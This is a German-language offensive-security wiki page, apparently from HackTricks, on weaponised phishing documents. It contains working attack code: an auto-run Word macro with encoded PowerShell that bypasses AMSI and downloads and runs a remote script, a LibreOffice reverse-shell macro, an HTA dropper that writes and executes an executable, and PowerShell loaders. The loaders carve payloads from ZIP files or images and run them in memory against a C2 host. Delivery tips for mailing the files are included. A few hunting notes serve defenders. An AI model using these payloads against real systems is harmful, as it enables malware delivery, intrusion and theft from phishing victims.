# Phishing Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung der Dateidaten durch. Die Validierung erfolgt in Form der Identifikation der Datenstrukturen gemäß dem OfficeOpenXML-Standard. Tritt ein Fehler bei der Identifikation der Datenstruktur auf, wird die zu analysierende Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien, die macros enthalten, die Endung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateiendung ändert, und dennoch die Ausführungsfähigkeit der macros beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei per Design keine macros, aber eine DOCM-Datei, die in RTF umbenannt wurde, wird von Microsoft Word behandelt und ist zur Ausführung von macros fähig.\
Die gleichen internen Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu prüfen, welche Dateiendungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine entfernte Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor durch Makros

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je gebräuchlicher sie sind, desto wahrscheinlicher wird der AV sie erkennen.

- AutoOpen()
- Document_Open()

#### Makro-Codebeispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **File > Info > Inspect Document > Inspect Document**, wodurch der Document Inspector geöffnet wird. Klicke **Inspect** und dann **Remove All** neben **Document Properties and Personal Information**.

#### Doc-Erweiterung

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\\
Tu dies, weil du **can't save macro's inside a `.docx`** und es ein **Stigma** gegenüber der macro-enabled **`.docm`** Erweiterung gibt (z. B. hat das Vorschaubild ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie komplett). Daher ist diese **legacy `.doc` extension der beste Kompromiss**.

#### Bösartige Macros-Generatoren

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT automatisch ausführbare macros (Basic)

LibreOffice Writer-Dokumente können Basic macros einbetten und automatisch ausführen, wenn die Datei geöffnet wird, indem das macro an das **Open Document**-Ereignis gebunden wird (Tools → Customize → Events → Open Document → Macro…). Ein einfaches reverse shell macro sieht so aus:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Beachte die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um literal Anführungszeichen zu maskieren, sodass Payloads, die mit `...==""")` enden, sowohl den inneren Befehl als auch das Shell-Argument ausgeglichen halten.

Delivery tips:

- Als `.odt` speichern und das Makro an das Dokumentereignis binden, sodass es sofort beim Öffnen ausgeführt wird.
- Beim Versand per E-Mail mit `swaks` verwende `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes, nicht der Dateiname, als Attachment gesendet werden). Das ist entscheidend beim Missbrauch von SMTP-Servern, die beliebige `RCPT TO` Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als "vollständig vertrauenswürdige" Anwendung ausgeführt, ohne die Beschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig** ist. Wenn dieser deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung "ferngesteuert"** zu **erzwingen**, zum Beispiel kannst du **unsichtbare Bilder** in E-Mails oder HTML einfügen, die der Benutzer aufruft (sogar HTTP MitM?). Oder sende dem Opfer den **Pfad zu Dateien**, die schon beim **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Siehe diese Ideen und mehr auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern ein ZIP, das zwei legitime Köderdokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader in den Rohbytes des ZIPs nach einem eindeutigen Marker gespeichert ist, und die .lnk ihn extrahiert und vollständig im Speicher ausführt.

Typischer Ablauf, implementiert durch einen .lnk PowerShell-Einzeiler:

1) Finde das ursprüngliche ZIP in üblichen Pfaden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.  
2) Lese die ZIP-Bytes und finde einen hardcodierten Marker (z.B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell payload.  
3) Kopiere das ZIP nach %ProgramData%, entpacke es dort und öffne die Köder-.docx, um legitim zu wirken.  
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Die nächste Stufe deobfuskieren (z. B. alle #‑Zeichen entfernen) und im Speicher ausführen.

Beispiel PowerShell-Skelett, um die eingebettete Stufe herauszuschneiden und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Delivery missbraucht häufig vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads hinter einem Gate verstecken (liefert harmlose ZIPs basierend auf IP/UA).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Festplatten-Artefakte zu minimieren.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die den ASCII-Markierungsstring (z. B. xFIQCV) enthalten, der an die Archivdaten angehängt ist.
- .lnk, das übergeordnete/Benutzerordner auflistet, um die ZIP zu finden und ein Köderdokument öffnet.
- AMSI-Manipulation via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende Business-Threads, die mit Links enden, die unter vertrauenswürdigen PaaS-Domains gehostet werden.

## Steganography-delimited payloads in images (PowerShell stager)

Aktuelle Loader-Ketten liefern ein obfuskiertes JavaScript/VBS, das einen Base64 PowerShell stager dekodiert und ausführt. Dieser Stager lädt ein Image herunter (oft GIF), das eine Base64-encoded .NET DLL enthält, die als Klartext zwischen eindeutigen Start-/End-Markern versteckt ist. Das Script sucht nach diesen Delimitern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den dazwischenliegenden Text, decodiert ihn von Base64 in Bytes, lädt die Assembly in-memory und ruft eine bekannte Entry-Methode mit der C2 URL auf.

Workflow
- Stufe 1: Archivierter JS/VBS dropper → dekodiert eingebettetes Base64 → startet PowerShell stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell stager → lädt Image herunter, schneidet marker-begrenztes Base64 aus, lädt die .NET DLL in-memory und ruft seine Methode (z. B. VAI) auf und übergibt die C2 URL und Optionen.
- Stufe 3: Loader ruft das finale Payload ab und injiziert es typischerweise via process hollowing in einen vertrauenswürdigen Binary (häufig MSBuild.exe). Siehe mehr über process hollowing und trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Hinweise
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding). Marker variieren zwischen Kampagnen.
- AMSI/ETW bypass und string deobfuscation werden häufig angewendet, bevor die Assembly geladen wird.
- Hunting: Scannen Sie heruntergeladene Images nach bekannten Delimitern; identifizieren Sie PowerShell-Aufrufe, die Images öffnen und sofort Base64-Blobs decodieren.

Siehe auch stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Eine wiederkehrende Anfangsphase ist ein kleines, stark obfuskiertes `.js` oder `.vbs`, das in einem Archiv geliefert wird. Sein alleiniger Zweck ist, einen eingebetteten Base64-String zu dekodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS einzuleiten.

Grundlegende Logik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Junk-Strings lokalisieren
- In ASCII PowerShell dekodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, die `powershell.exe` aufrufen

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## Windows files to steal NTLM hashes

Siehe die Seite über **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
